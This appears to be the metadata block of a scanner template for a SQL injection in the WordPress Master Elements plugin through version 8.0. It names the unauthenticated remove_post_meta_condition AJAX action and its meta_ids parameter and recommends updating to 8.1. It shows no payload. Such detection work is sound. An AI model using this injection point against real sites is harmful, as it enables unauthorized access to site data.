info:
  name: WordPress Master Elements <=8.0 - SQL Injection
  author: theamanrawat
  severity: critical
  description: |
    WordPress Master Elements plugin through 8.0 contains a SQL injection vulnerability. The plugin does not validate and escape the meta_ids parameter of its remove_post_meta_condition AJAX action, available to both unauthenticated and authenticated users, before using it in a SQL statement. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary SQL queries, potentially leading to unauthorized access, data leakage, or further compromise of the WordPress site.
  remediation: |
    Update to the latest version of WordPress Master Elements plugin (>=8.1) to mitigate the SQL Injection vulnerability.
